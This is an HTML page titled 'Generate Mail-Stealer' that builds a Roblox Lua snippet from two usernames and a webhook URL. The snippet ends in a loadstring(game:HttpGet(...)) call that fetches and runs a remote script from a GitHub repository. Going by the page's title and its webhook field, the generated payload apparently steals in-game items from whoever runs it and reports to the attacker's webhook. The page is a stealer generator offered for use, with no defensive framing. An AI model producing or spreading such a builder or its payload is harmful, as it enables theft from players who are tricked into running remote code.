<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Coen On Top</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/styles/default.min.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/highlight.min.js"></script>
  <style>
    /* Global Styles */
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
      text-align: center;
      padding: 50px;
    }

    /* Container Styles */
    .container {
      background-color: white;
      padding: 20px;
      border-radius: 8px;
      display: inline-block;
    }

    /* Input Field Styles */
    .input-field {
      margin: 10px 0;
    }

    /* Button Styles */
    button {
      padding: 10px 20px;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    button:hover {
      background-color: #0056b3;
    }

    /* Output Styles */
    #output {
      text-align: left;
      white-space: pre-wrap;
    }

    /* Textarea Styles */
    textarea {
      width: 100%;
      height: 150px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Generate Mail-Stealer</h1>
    <form>
      <label for="username">Username:</label>
      <input type="text" id="username" name="username"><br><br>
      <label for="username2">Username2:</label>
      <input type="text" id="username2" name="username2"><br><br>
      <label for="webhook">Webhook URL:</label>
      <input type="text" id="webhook" name="webhook"><br><br>
      <button type="button" onclick="generateOutput()">Generate</button>
      <textarea id="output"></textarea><br><br>
      <button type="button" onclick="copyToClipboard()">Copy to Clipboard</button>
    </form>
  </div>

  <script>
    function generateOutput() {
      const username = document.getElementById("username").value;
      const username2 = document.getElementById("username2").value;
      const webhook = document.getElementById("webhook").value;
      const outputString = `Username = "${username.charAt(0).toUpperCase()}${username.slice(1)}"\n` +
                           `Username2 = "${username2.charAt(0).toUpperCase()}${username2.slice(1)}"\n` +
                           `Webhook = "${webhook.charAt(0).toUpperCase()}${webhook.slice(1)}"\n` +
                           'loadstring(game:HttpGet("https://raw.githubusercontent.com/Abyssal453/AbyssalXY/main/Ps99.lua"))()';
      document.getElementById("output").value = outputString;
      hljs.highlightAll();
    }

    function copyToClipboard() {
      const copyText = document.getElementById("output");
      copyText.select();
      document.execCommand("copy");
    }
  </script>
</body>
</html>
